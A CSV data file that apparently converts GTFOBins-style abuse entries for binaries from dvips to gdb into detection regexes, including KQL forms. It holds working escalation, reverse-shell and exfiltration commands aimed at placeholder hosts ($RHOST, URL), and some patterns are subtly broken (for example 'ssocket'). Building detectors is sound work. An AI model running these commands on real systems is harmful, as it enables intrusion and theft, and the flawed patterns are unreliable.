Name,Function,ExampleCode,KeywordsExtracted,RegexFuzzyV7,RegexFuzzyV7_KQL,Notes
dvips,shell,"tex '\special{psfile=""`/bin/sh 1>&0""}\end'
dvips -R0 texput.dvi",tex special psfile= /bin/sh end texput.dvi,(?i)\b(?:\S*/)?dvips.*tex.*special.*psfile.*/bin/sh.*end.*texput\.dvi,"@""(?i)\b(?:\S*/)?dvips.*tex.*special.*psfile.*/bin/sh.*end.*texput\.dvi""",
dvips,sudo,"tex '\special{psfile=""`/bin/sh 1>&0""}\end'
sudo dvips -R0 texput.dvi",tex special psfile= /bin/sh end sudo texput.dvi,(?i)\b(?:\S*/)?dvips.*tex.*special.*psfile.*/bin/sh.*end.*sudo.*texput\.dvi,"@""(?i)\b(?:\S*/)?dvips.*tex.*special.*psfile.*/bin/sh.*end.*sudo.*texput\.dvi""",
dvips,limited-suid,"tex '\special{psfile=""`/bin/sh 1>&0""}\end'
./dvips -R0 texput.dvi",tex special psfile= /bin/sh end texput.dvi /dvips,(?i)\b(?:\S*/)?dvips.*tex.*special.*psfile.*/bin/sh.*end.*texput\.dvi.*/dvips,"@""(?i)\b(?:\S*/)?dvips.*tex.*special.*psfile.*/bin/sh.*end.*texput\.dvi.*/dvips""",
easy_install,shell,"echo ""import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')"" > $TF/setup.py
easy_install $TF",echo import os.execl /bin/sh sh tty TF/setup.py /setup.py,(?i)\b(?:\S*/)?easy_install.*echo.*import.*os\.execl.*/bin/sh.*sh.*tty.*TF/setup\.py.*/setup\.py,"@""(?i)\b(?:\S*/)?easy_install.*echo.*import.*os\.execl.*/bin/sh.*sh.*tty.*TF/setup\.py.*/setup\.py""",
easy_install,reverse-shell,"echo 'import sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT""))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn(""/bin/sh"")' > $TF/setup.py
easy_install $TF",echo import sys pty s=socket.socket s.connect os.getenv int os.dup2 s.fileno for pty.spawn /bin/sh TF/setup.py /setup.py,(?i)\b(?:\S*/)?easy_install.*echo.*import.*sys.*pty.*ssocket\.socket.*s\.connect.*os\.getenv.*int,"@""(?i)\b(?:\S*/)?easy_install.*echo.*import.*sys.*pty.*ssocket\.socket.*s\.connect.*os\.getenv.*int""",
easy_install,file-upload,"echo 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode()))' > $TF/setup.py
easy_install $TF",echo import sys from environ sys.version_info.major urllib.request urllib.parse else urllib urllib2 r.urlopen bytes u.urlencode open .read .encode TF/setup.py /setup.py,(?i)\b(?:\S*/)?easy_install.*echo.*import.*sys.*from.*environ.*sys\.version_info\.major.*urllib\.request.*urllib\.parse,"@""(?i)\b(?:\S*/)?easy_install.*echo.*import.*sys.*from.*environ.*sys\.version_info\.major.*urllib\.request.*urllib\.parse""",
easy_install,file-upload,"echo 'import sys; from os import environ as e
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever()' > $TF/setup.py
easy_install $TF",echo import sys from environ sys.version_info.major http.server socketserver else SimpleHTTPServer ss.TCPServer int s.SimpleHTTPRequestHandler .serve_forever TF/setup.py /setup.py,(?i)\b(?:\S*/)?easy_install.*echo.*import.*sys.*from.*environ.*sys\.version_info\.major.*http\.server.*socketserver,"@""(?i)\b(?:\S*/)?easy_install.*echo.*import.*sys.*from.*environ.*sys\.version_info\.major.*http\.server.*socketserver""",
easy_install,file-download,"echo ""import os;
os.execl('$(whereis python)', '$(whereis python)', '-c', \""\""\""import sys;
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve('$URL', '$LFILE')\""\""\"")"" > $TF/setup.py
pip install $TF",echo import os.execl whereis python sys sys.version_info.major urllib.request else urllib r.urlretrieve TF/setup.py pip install /setup.py,(?i)\b(?:\S*/)?easy_install.*echo.*import.*os\.execl.*whereis.*python.*sys.*sys\.version_info\.major.*urllib\.request,"@""(?i)\b(?:\S*/)?easy_install.*echo.*import.*os\.execl.*whereis.*python.*sys.*sys\.version_info\.major.*urllib\.request""",
easy_install,file-write,"echo ""import os;
os.execl('$(whereis python)', 'python', '-c', 'open(\""$LFILE\"",\""w+\"").write(\""DATA\"")')"" > $TF/setup.py
easy_install $TF",echo import os.execl whereis python open .write TF/setup.py /setup.py,(?i)\b(?:\S*/)?easy_install.*echo.*import.*os\.execl.*whereis.*python.*open.*\.write.*TF/setup\.py,"@""(?i)\b(?:\S*/)?easy_install.*echo.*import.*os\.execl.*whereis.*python.*open.*\.write.*TF/setup\.py""",
easy_install,file-read,"echo 'print(open(""file_to_read"").read())' > $TF/setup.py
easy_install $TF",echo print open .read TF/setup.py /setup.py,(?i)\b(?:\S*/)?easy_install.*echo.*print.*open.*\.read.*TF/setup\.py.*/setup\.py,"@""(?i)\b(?:\S*/)?easy_install.*echo.*print.*open.*\.read.*TF/setup\.py.*/setup\.py""",
easy_install,library-load,"echo 'from ctypes import cdll; cdll.LoadLibrary(""lib.so"")' > $TF/setup.py
easy_install $TF",echo from ctypes import cdll cdll.LoadLibrary lib.so TF/setup.py /setup.py,(?i)\b(?:\S*/)?easy_install.*echo.*from.*ctypes.*import.*cdll.*cdll\.LoadLibrary.*lib\.so.*TF/setup\.py,"@""(?i)\b(?:\S*/)?easy_install.*echo.*from.*ctypes.*import.*cdll.*cdll\.LoadLibrary.*lib\.so.*TF/setup\.py""",
easy_install,sudo,"echo ""import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')"" > $TF/setup.py
sudo easy_install $TF",echo import os.execl /bin/sh sh tty TF/setup.py sudo /setup.py,(?i)\b(?:\S*/)?easy_install.*echo.*import.*os\.execl.*/bin/sh.*sh.*tty.*TF/setup\.py.*sudo,"@""(?i)\b(?:\S*/)?easy_install.*echo.*import.*os\.execl.*/bin/sh.*sh.*tty.*TF/setup\.py.*sudo""",
eb,shell,"eb logs
!/bin/sh",logs /bin/sh,(?i)\b(?:\S*/)?eb.*logs.*/bin/sh,"@""(?i)\b(?:\S*/)?eb.*logs.*/bin/sh""",
eb,sudo,"sudo eb logs
!/bin/sh",sudo logs /bin/sh,(?i)\b(?:\S*/)?eb.*sudo.*logs.*/bin/sh,"@""(?i)\b(?:\S*/)?eb.*sudo.*logs.*/bin/sh""",
ed,shell,"ed
!/bin/sh",/bin/sh,(?i)\b(?:\S*/)?ed.*/bin/sh,"@""(?i)\b(?:\S*/)?ed.*/bin/sh""",
ed,file-write,"ed file_to_write
a
DATA
.
w
q",,(?i)\b(?:\S*/)?ed\b,"@""(?i)\b(?:\S*/)?ed\b""",
ed,file-read,"ed file_to_read
,p
q",,(?i)\b(?:\S*/)?ed\b,"@""(?i)\b(?:\S*/)?ed\b""",
ed,suid,"./ed file_to_read
,p
q",,(?i)\b(?:\S*/)?ed\b,"@""(?i)\b(?:\S*/)?ed\b""",
ed,sudo,"sudo ed
!/bin/sh",sudo /bin/sh,(?i)\b(?:\S*/)?ed.*sudo.*/bin/sh,"@""(?i)\b(?:\S*/)?ed.*sudo.*/bin/sh""",
ed,limited-suid,"./ed
!/bin/sh",/bin/sh,(?i)\b(?:\S*/)?ed.*/bin/sh,"@""(?i)\b(?:\S*/)?ed.*/bin/sh""",
efax,suid,"./efax -d ""$LFILE""",/efax,(?i)\b(?:\S*/)?efax.*/efax,"@""(?i)\b(?:\S*/)?efax.*/efax""",
efax,sudo,"sudo efax -d ""$LFILE""",sudo,(?i)\b(?:\S*/)?efax.*sudo,"@""(?i)\b(?:\S*/)?efax.*sudo""",
elvish,file-read,elvish -c 'echo (slurp <$E:LFILE)',echo slurp,(?i)\b(?:\S*/)?elvish.*echo.*slurp,"@""(?i)\b(?:\S*/)?elvish.*echo.*slurp""",
elvish,file-write,elvish -c 'echo DATA >$E:LFILE',echo,(?i)\b(?:\S*/)?elvish.*echo,"@""(?i)\b(?:\S*/)?elvish.*echo""",
elvish,shell,elvish,,(?i)\b(?:\S*/)?elvish\b,"@""(?i)\b(?:\S*/)?elvish\b""",
elvish,suid,./elvish,/elvish,(?i)\b(?:\S*/)?elvish.*/elvish,"@""(?i)\b(?:\S*/)?elvish.*/elvish""",
elvish,sudo,sudo elvish,sudo,(?i)\b(?:\S*/)?elvish.*sudo,"@""(?i)\b(?:\S*/)?elvish.*sudo""",
emacs,shell,"emacs -Q -nw --eval '(term ""/bin/sh"")'","""--eval term /bin/sh",(?i)\b(?:\S*/)?emacs.*\-\-eval.*term.*/bin/sh,"@""(?i)\b(?:\S*/)?emacs.*\-\-eval.*term.*/bin/sh""",
emacs,file-write,"emacs file_to_write
DATA
C-x C-s",,(?i)\b(?:\S*/)?emacs\b,"@""(?i)\b(?:\S*/)?emacs\b""",
emacs,file-read,emacs file_to_read,,(?i)\b(?:\S*/)?emacs\b,"@""(?i)\b(?:\S*/)?emacs\b""",
emacs,suid,"./emacs -Q -nw --eval '(term ""/bin/sh -p"")'","""--eval term /bin/sh /emacs",(?i)\b(?:\S*/)?emacs.*\-\-eval.*term.*/bin/sh.*/emacs,"@""(?i)\b(?:\S*/)?emacs.*\-\-eval.*term.*/bin/sh.*/emacs""",
emacs,sudo,"sudo emacs -Q -nw --eval '(term ""/bin/sh"")'",sudo --eval term /bin/sh,(?i)\b(?:\S*/)?emacs.*sudo.*\-\-eval.*term.*/bin/sh,"@""(?i)\b(?:\S*/)?emacs.*sudo.*\-\-eval.*term.*/bin/sh""",
enscript,shell,enscript /dev/null -qo /dev/null -I '/bin/sh >&2',/dev/null /bin/sh,(?i)\b(?:\S*/)?enscript.*/dev/null.*/bin/sh,"@""(?i)\b(?:\S*/)?enscript.*/dev/null.*/bin/sh""",
enscript,sudo,sudo enscript /dev/null -qo /dev/null -I '/bin/sh >&2',sudo /dev/null /bin/sh,(?i)\b(?:\S*/)?enscript.*sudo.*/dev/null.*/bin/sh,"@""(?i)\b(?:\S*/)?enscript.*sudo.*/dev/null.*/bin/sh""",
env,shell,env /bin/sh,/bin/sh,(?i)\b(?:\S*/)?env.*/bin/sh,"@""(?i)\b(?:\S*/)?env.*/bin/sh""",
env,suid,./env /bin/sh -p,/bin/sh /env,(?i)\b(?:\S*/)?env.*/bin/sh.*/env,"@""(?i)\b(?:\S*/)?env.*/bin/sh.*/env""",
env,sudo,sudo env /bin/sh,sudo /bin/sh,(?i)\b(?:\S*/)?env.*sudo.*/bin/sh,"@""(?i)\b(?:\S*/)?env.*sudo.*/bin/sh""",
eqn,file-read,"eqn ""$LFILE""",,(?i)\b(?:\S*/)?eqn\b,"@""(?i)\b(?:\S*/)?eqn\b""",
eqn,suid,"./eqn ""$LFILE""",/eqn,(?i)\b(?:\S*/)?eqn.*/eqn,"@""(?i)\b(?:\S*/)?eqn.*/eqn""",
eqn,sudo,"sudo eqn ""$LFILE""",sudo,(?i)\b(?:\S*/)?eqn.*sudo,"@""(?i)\b(?:\S*/)?eqn.*sudo""",
espeak,file-read,"espeak -qXf ""$LFILE""","""-qXf",(?i)\b(?:\S*/)?espeak.*\-qXf,"@""(?i)\b(?:\S*/)?espeak.*\-qXf""",
espeak,suid,"./espeak -qXf ""$LFILE""","""-qXf /espeak",(?i)\b(?:\S*/)?espeak.*\-qXf.*/espeak,"@""(?i)\b(?:\S*/)?espeak.*\-qXf.*/espeak""",
espeak,sudo,"sudo espeak -qXf ""$LFILE""",sudo -qXf,(?i)\b(?:\S*/)?espeak.*sudo.*\-qXf,"@""(?i)\b(?:\S*/)?espeak.*sudo.*\-qXf""",
ex,shell,"ex
!/bin/sh",/bin/sh,(?i)\b(?:\S*/)?ex.*/bin/sh,"@""(?i)\b(?:\S*/)?ex.*/bin/sh""",
ex,file-write,"ex file_to_write
a
DATA
.
w
q",,(?i)\b(?:\S*/)?ex\b,"@""(?i)\b(?:\S*/)?ex\b""",
ex,file-read,"ex file_to_read
,p
q",,(?i)\b(?:\S*/)?ex\b,"@""(?i)\b(?:\S*/)?ex\b""",
ex,sudo,"sudo ex
!/bin/sh",sudo /bin/sh,(?i)\b(?:\S*/)?ex.*sudo.*/bin/sh,"@""(?i)\b(?:\S*/)?ex.*sudo.*/bin/sh""",
exiftool,file-read,"exiftool -filename=$OUTPUT $LFILE
cat $OUTPUT","""-filename= OUTPUT cat",(?i)\b(?:\S*/)?exiftool.*\-filename.*OUTPUT.*cat,"@""(?i)\b(?:\S*/)?exiftool.*\-filename.*OUTPUT.*cat""",
exiftool,file-write,exiftool -filename=$LFILE $INPUT,"""-filename= INPUT",(?i)\b(?:\S*/)?exiftool.*\-filename.*INPUT,"@""(?i)\b(?:\S*/)?exiftool.*\-filename.*INPUT""",
exiftool,sudo,sudo exiftool -filename=$LFILE $INPUT,sudo -filename= INPUT,(?i)\b(?:\S*/)?exiftool.*sudo.*\-filename.*INPUT,"@""(?i)\b(?:\S*/)?exiftool.*sudo.*\-filename.*INPUT""",
expand,file-read,"expand ""$LFILE""",,(?i)\b(?:\S*/)?expand\b,"@""(?i)\b(?:\S*/)?expand\b""",
expand,suid,"./expand ""$LFILE""",/expand,(?i)\b(?:\S*/)?expand.*/expand,"@""(?i)\b(?:\S*/)?expand.*/expand""",
expand,sudo,"sudo expand ""$LFILE""",sudo,(?i)\b(?:\S*/)?expand.*sudo,"@""(?i)\b(?:\S*/)?expand.*sudo""",
expect,file-read,expect $LFILE,,(?i)\b(?:\S*/)?expect\b,"@""(?i)\b(?:\S*/)?expect\b""",
expect,shell,expect -c 'spawn /bin/sh;interact',spawn /bin/sh interact,(?i)\b(?:\S*/)?expect.*spawn.*/bin/sh.*interact,"@""(?i)\b(?:\S*/)?expect.*spawn.*/bin/sh.*interact""",
expect,suid,./expect -c 'spawn /bin/sh -p;interact',spawn /bin/sh interact /expect,(?i)\b(?:\S*/)?expect.*spawn.*/bin/sh.*interact.*/expect,"@""(?i)\b(?:\S*/)?expect.*spawn.*/bin/sh.*interact.*/expect""",
expect,sudo,sudo expect -c 'spawn /bin/sh;interact',sudo spawn /bin/sh interact,(?i)\b(?:\S*/)?expect.*sudo.*spawn.*/bin/sh.*interact,"@""(?i)\b(?:\S*/)?expect.*sudo.*spawn.*/bin/sh.*interact""",
facter,shell,"echo 'exec(""/bin/sh"")' > $TF/x.rb
FACTERLIB=$TF facter",echo exec /bin/sh FACTERLIB=,(?i)\b(?:\S*/)?facter.*echo.*exec.*/bin/sh.*FACTERLIB,"@""(?i)\b(?:\S*/)?facter.*echo.*exec.*/bin/sh.*FACTERLIB""",
facter,sudo,"echo 'exec(""/bin/sh"")' > $TF/x.rb
sudo FACTERLIB=$TF facter",echo exec /bin/sh sudo FACTERLIB=,(?i)\b(?:\S*/)?facter.*echo.*exec.*/bin/sh.*sudo.*FACTERLIB,"@""(?i)\b(?:\S*/)?facter.*echo.*exec.*/bin/sh.*sudo.*FACTERLIB""",
file,file-read,file -f $LFILE,,(?i)\b(?:\S*/)?file\b,"@""(?i)\b(?:\S*/)?file\b""",
file,file-read,file -m $LFILE,,(?i)\b(?:\S*/)?file\b,"@""(?i)\b(?:\S*/)?file\b""",
file,suid,./file -f $LFILE,/file,(?i)\b(?:\S*/)?file.*/file,"@""(?i)\b(?:\S*/)?file.*/file""",
file,sudo,sudo file -f $LFILE,sudo,(?i)\b(?:\S*/)?file.*sudo,"@""(?i)\b(?:\S*/)?file.*sudo""",
find,shell,find . -exec /bin/sh \; -quit,"""-exec /bin/sh -quit",(?i)\b(?:\S*/)?find.*\-exec.*/bin/sh.*\-quit,"@""(?i)\b(?:\S*/)?find.*\-exec.*/bin/sh.*\-quit""",
find,suid,./find . -exec /bin/sh -p \; -quit,"""-exec /bin/sh -quit /find",(?i)\b(?:\S*/)?find.*\-exec.*/bin/sh.*\-quit.*/find,"@""(?i)\b(?:\S*/)?find.*\-exec.*/bin/sh.*\-quit.*/find""",
find,sudo,sudo find . -exec /bin/sh \; -quit,sudo -exec /bin/sh -quit,(?i)\b(?:\S*/)?find.*sudo.*\-exec.*/bin/sh.*\-quit,"@""(?i)\b(?:\S*/)?find.*sudo.*\-exec.*/bin/sh.*\-quit""",
find,file-write,"find / -fprintf ""$FILE"" DATA -quit","""-fprintf -quit",(?i)\b(?:\S*/)?find.*\-fprintf.*\-quit,"@""(?i)\b(?:\S*/)?find.*\-fprintf.*\-quit""",
finger,file-upload,"finger ""$(base64 $LFILE)@$RHOST""",base64,(?i)\b(?:\S*/)?finger.*base64,"@""(?i)\b(?:\S*/)?finger.*base64""",
finger,file-download,"finger x@$RHOST | base64 -d > ""$LFILE""",base64,(?i)\b(?:\S*/)?finger.*base64,"@""(?i)\b(?:\S*/)?finger.*base64""",
fish,shell,fish,,(?i)\b(?:\S*/)?fish\b,"@""(?i)\b(?:\S*/)?fish\b""",
fish,suid,./fish,/fish,(?i)\b(?:\S*/)?fish.*/fish,"@""(?i)\b(?:\S*/)?fish.*/fish""",
fish,sudo,sudo fish,sudo,(?i)\b(?:\S*/)?fish.*sudo,"@""(?i)\b(?:\S*/)?fish.*sudo""",
flock,shell,flock -u / /bin/sh,/bin/sh,(?i)\b(?:\S*/)?flock.*/bin/sh,"@""(?i)\b(?:\S*/)?flock.*/bin/sh""",
flock,suid,./flock -u / /bin/sh -p,/bin/sh /flock,(?i)\b(?:\S*/)?flock.*/bin/sh.*/flock,"@""(?i)\b(?:\S*/)?flock.*/bin/sh.*/flock""",
flock,sudo,sudo flock -u / /bin/sh,sudo /bin/sh,(?i)\b(?:\S*/)?flock.*sudo.*/bin/sh,"@""(?i)\b(?:\S*/)?flock.*sudo.*/bin/sh""",
fmt,file-read,"fmt -pNON_EXISTING_PREFIX ""$LFILE""","""-pNON_EXISTING_PREFIX",(?i)\b(?:\S*/)?fmt.*\-pNON_EXISTING_PREFIX,"@""(?i)\b(?:\S*/)?fmt.*\-pNON_EXISTING_PREFIX""",
fmt,file-read,"fmt -999 ""$LFILE""",,(?i)\b(?:\S*/)?fmt\b,"@""(?i)\b(?:\S*/)?fmt\b""",
fmt,suid,"./fmt -999 ""$LFILE""",/fmt,(?i)\b(?:\S*/)?fmt.*/fmt,"@""(?i)\b(?:\S*/)?fmt.*/fmt""",
fmt,sudo,"sudo fmt -999 ""$LFILE""",sudo,(?i)\b(?:\S*/)?fmt.*sudo,"@""(?i)\b(?:\S*/)?fmt.*sudo""",
fold,file-read,"fold -w99999999 ""$LFILE""",,(?i)\b(?:\S*/)?fold\b,"@""(?i)\b(?:\S*/)?fold\b""",
fold,suid,"./fold -w99999999 ""$LFILE""",/fold,(?i)\b(?:\S*/)?fold.*/fold,"@""(?i)\b(?:\S*/)?fold.*/fold""",
fold,sudo,"sudo fold -w99999999 ""$LFILE""",sudo,(?i)\b(?:\S*/)?fold.*sudo,"@""(?i)\b(?:\S*/)?fold.*sudo""",
fping,file-read,fping -f $LFILE,,(?i)\b(?:\S*/)?fping\b,"@""(?i)\b(?:\S*/)?fping\b""",
fping,sudo,sudo fping -f $LFILE,sudo,(?i)\b(?:\S*/)?fping.*sudo,"@""(?i)\b(?:\S*/)?fping.*sudo""",
ftp,shell,"ftp
!/bin/sh",/bin/sh,(?i)\b(?:\S*/)?ftp.*/bin/sh,"@""(?i)\b(?:\S*/)?ftp.*/bin/sh""",
ftp,file-upload,"ftp $RHOST
put file_to_send",put file_to_send,(?i)\b(?:\S*/)?ftp.*put.*file_to_send,"@""(?i)\b(?:\S*/)?ftp.*put.*file_to_send""",
ftp,file-download,"ftp $RHOST
get file_to_get",get file_to_get,(?i)\b(?:\S*/)?ftp.*get.*file_to_get,"@""(?i)\b(?:\S*/)?ftp.*get.*file_to_get""",
ftp,sudo,"sudo ftp
!/bin/sh",sudo /bin/sh,(?i)\b(?:\S*/)?ftp.*sudo.*/bin/sh,"@""(?i)\b(?:\S*/)?ftp.*sudo.*/bin/sh""",
gawk,shell,"gawk 'BEGIN {system(""/bin/sh"")}'",BEGIN system /bin/sh,(?i)\b(?:\S*/)?gawk.*BEGIN.*system.*/bin/sh,"@""(?i)\b(?:\S*/)?gawk.*BEGIN.*system.*/bin/sh""",
gawk,non-interactive-reverse-shell,"gawk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {
    s = ""/inet/tcp/0/"" RHOST ""/"" RPORT;
    while (1) {printf ""> "" |& s; if ((s |& getline c) <= 0) break;
    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'",RHOST= RPORT= BEGIN /inet/tcp/0/ while printf getline break print close,(?i)\b(?:\S*/)?gawk.*RHOST.*RPORT.*BEGIN.*/inet/tcp/0/.*while.*printf.*getline.*break,"@""(?i)\b(?:\S*/)?gawk.*RHOST.*RPORT.*BEGIN.*/inet/tcp/0/.*while.*printf.*getline.*break""",
gawk,non-interactive-bind-shell,"gawk -v LPORT=$LPORT 'BEGIN {
    s = ""/inet/tcp/"" LPORT ""/0/0"";
    while (1) {printf ""> "" |& s; if ((s |& getline c) <= 0) break;
    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'",LPORT= BEGIN /inet/tcp/ while printf getline break print close,(?i)\b(?:\S*/)?gawk.*LPORT.*BEGIN.*/inet/tcp/.*while.*printf.*getline.*break.*print,"@""(?i)\b(?:\S*/)?gawk.*LPORT.*BEGIN.*/inet/tcp/.*while.*printf.*getline.*break.*print""",
gawk,file-write,"gawk -v LFILE=$LFILE 'BEGIN { print ""DATA"" > LFILE }'",LFILE= BEGIN print,(?i)\b(?:\S*/)?gawk.*LFILE.*BEGIN.*print,"@""(?i)\b(?:\S*/)?gawk.*LFILE.*BEGIN.*print""",
gawk,file-read,"gawk '//' ""$LFILE""",,(?i)\b(?:\S*/)?gawk\b,"@""(?i)\b(?:\S*/)?gawk\b""",
gawk,suid,"./gawk '//' ""$LFILE""",/gawk,(?i)\b(?:\S*/)?gawk.*/gawk,"@""(?i)\b(?:\S*/)?gawk.*/gawk""",
gawk,sudo,"sudo gawk 'BEGIN {system(""/bin/sh"")}'",sudo BEGIN system /bin/sh,(?i)\b(?:\S*/)?gawk.*sudo.*BEGIN.*system.*/bin/sh,"@""(?i)\b(?:\S*/)?gawk.*sudo.*BEGIN.*system.*/bin/sh""",
gawk,limited-suid,"./gawk 'BEGIN {system(""/bin/sh"")}'",BEGIN system /bin/sh /gawk,(?i)\b(?:\S*/)?gawk.*BEGIN.*system.*/bin/sh.*/gawk,"@""(?i)\b(?:\S*/)?gawk.*BEGIN.*system.*/bin/sh.*/gawk""",
gcc,file-read,"gcc -x c -E ""$LFILE""",,(?i)\b(?:\S*/)?gcc\b,"@""(?i)\b(?:\S*/)?gcc\b""",
gcc,file-read,"gcc @""$LFILE""",,(?i)\b(?:\S*/)?gcc\b,"@""(?i)\b(?:\S*/)?gcc\b""",
gcc,file-write,gcc -xc /dev/null -o $LFILE,/dev/null,(?i)\b(?:\S*/)?gcc.*/dev/null,"@""(?i)\b(?:\S*/)?gcc.*/dev/null""",
gcc,shell,"gcc -wrapper /bin/sh,-s .","""-wrapper /bin/sh",(?i)\b(?:\S*/)?gcc.*\-wrapper.*/bin/sh,"@""(?i)\b(?:\S*/)?gcc.*\-wrapper.*/bin/sh""",
gcc,sudo,"sudo gcc -wrapper /bin/sh,-s .",sudo -wrapper /bin/sh,(?i)\b(?:\S*/)?gcc.*sudo.*\-wrapper.*/bin/sh,"@""(?i)\b(?:\S*/)?gcc.*sudo.*\-wrapper.*/bin/sh""",
gcloud,shell,"gcloud help
!/bin/sh",help /bin/sh,(?i)\b(?:\S*/)?gcloud.*help.*/bin/sh,"@""(?i)\b(?:\S*/)?gcloud.*help.*/bin/sh""",
gcloud,sudo,"sudo gcloud help
!/bin/sh",sudo help /bin/sh,(?i)\b(?:\S*/)?gcloud.*sudo.*help.*/bin/sh,"@""(?i)\b(?:\S*/)?gcloud.*sudo.*help.*/bin/sh""",
gcore,file-read,gcore $PID,PID,(?i)\b(?:\S*/)?gcore.*PID,"@""(?i)\b(?:\S*/)?gcore.*PID""",
gcore,sudo,sudo gcore $PID,sudo PID,(?i)\b(?:\S*/)?gcore.*sudo.*PID,"@""(?i)\b(?:\S*/)?gcore.*sudo.*PID""",
gcore,suid,./gcore $PID,PID /gcore,(?i)\b(?:\S*/)?gcore.*PID.*/gcore,"@""(?i)\b(?:\S*/)?gcore.*PID.*/gcore""",
gdb,shell,gdb -nx -ex '!sh' -ex quit,sh quit,(?i)\b(?:\S*/)?gdb.*sh.*quit,"@""(?i)\b(?:\S*/)?gdb.*sh.*quit""",
gdb,reverse-shell,"gdb -nx -ex 'python import sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT""))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn(""/bin/sh"")' -ex quit",python import sys pty s=socket.socket s.connect os.getenv int os.dup2 s.fileno for pty.spawn /bin/sh quit,(?i)\b(?:\S*/)?gdb.*python.*import.*sys.*pty.*ssocket\.socket.*s\.connect.*os\.getenv.*int,"@""(?i)\b(?:\S*/)?gdb.*python.*import.*sys.*pty.*ssocket\.socket.*s\.connect.*os\.getenv.*int""",
gdb,file-upload,"gdb -nx -ex 'python import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode()))' -ex quit",python import sys from environ sys.version_info.major urllib.request urllib.parse else urllib urllib2 r.urlopen bytes u.urlencode open .read .encode quit,(?i)\b(?:\S*/)?gdb.*python.*import.*sys.*from.*environ.*sys\.version_info\.major.*urllib\.request.*urllib\.parse,"@""(?i)\b(?:\S*/)?gdb.*python.*import.*sys.*from.*environ.*sys\.version_info\.major.*urllib\.request.*urllib\.parse""",
gdb,file-upload,"gdb -nx -ex 'python import sys; from os import environ as e
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever()' -ex quit",python import sys from environ sys.version_info.major http.server socketserver else SimpleHTTPServer ss.TCPServer int s.SimpleHTTPRequestHandler .serve_forever quit,(?i)\b(?:\S*/)?gdb.*python.*import.*sys.*from.*environ.*sys\.version_info\.major.*http\.server.*socketserver,"@""(?i)\b(?:\S*/)?gdb.*python.*import.*sys.*from.*environ.*sys\.version_info\.major.*http\.server.*socketserver""",
gdb,file-download,"gdb -nx -ex 'python import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e[""URL""], e[""LFILE""])' -ex quit",python import sys from environ sys.version_info.major urllib.request else urllib r.urlretrieve quit,(?i)\b(?:\S*/)?gdb.*python.*import.*sys.*from.*environ.*sys\.version_info\.major.*urllib\.request.*else,"@""(?i)\b(?:\S*/)?gdb.*python.*import.*sys.*from.*environ.*sys\.version_info\.major.*urllib\.request.*else""",
gdb,file-write,"gdb -nx -ex ""dump value $LFILE \""DATA\"""" -ex quit",dump value quit,(?i)\b(?:\S*/)?gdb.*dump.*value.*quit,"@""(?i)\b(?:\S*/)?gdb.*dump.*value.*quit""",
gdb,file-read,"gdb -nx -ex 'python print(open(""file_to_read"").read())' -ex quit",python print open .read quit,(?i)\b(?:\S*/)?gdb.*python.*print.*open.*\.read.*quit,"@""(?i)\b(?:\S*/)?gdb.*python.*print.*open.*\.read.*quit""",
